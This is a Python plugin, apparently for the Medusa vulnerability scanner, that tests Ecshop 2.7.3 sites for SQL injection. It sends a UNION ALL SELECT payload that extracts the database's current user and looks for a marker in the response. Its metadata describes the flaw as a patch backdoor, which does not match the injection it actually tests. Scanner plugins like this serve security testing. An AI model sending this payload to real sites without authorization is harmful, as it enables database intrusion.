#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
from ClassCongregation import UrlProcessing,VulnerabilityDetails,WriteFile,ErrorLog,ErrorHandling,Proxies

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "KpLi0rn"  # 插件作者
        self.info['create_date'] = "2020-04-17"  # 插件编辑时间
        self.info['disclosure']='2015-01-20'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "EcshopSQLInjectionVulnerability"  # 插件名称
        self.info['name'] ='EcshopSQL注入漏洞' #漏洞名称
        self.info['affects'] = "Ecshop"  # 漏洞组件
        self.info['desc_content'] = "ECShop是国内一款流行的网店管理系统软件其2.7.3版本某个补丁存在后门文件攻击者利用后门可以控制网站"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新的系统"  # 修复建议
        self.info['version'] = "2.7.3"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = '/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php'
        payload_url = scheme + "://" + url +":"+ str(port) + payload
        headers = {
            'User-Agent': RandomAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json",
        }
        data = {'return_data': 'json',
                      'ac': '1',
                      'act': 'search_goods_list',
                      'api_version': '1.0',
                      'last_modify_st_time': '1',
                      'last_modify_en_time': '1',
                      'pages': '1',
                      'counts': '1 UNION ALL SELECT NULL,CONCAT(0x666630303030,IFNULL(CAST(CURRENT_USER()AS CHAR),0x20),0x20)#'}
        resp = requests.post(payload_url,headers=headers, data=data, timeout=6, proxies=proxies, verify=False)
        con = resp.text
        if con.find("ff0000") != -1:
            Medusa = "{}存在EcshopSQL注入漏洞\r\n漏洞地址:{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类
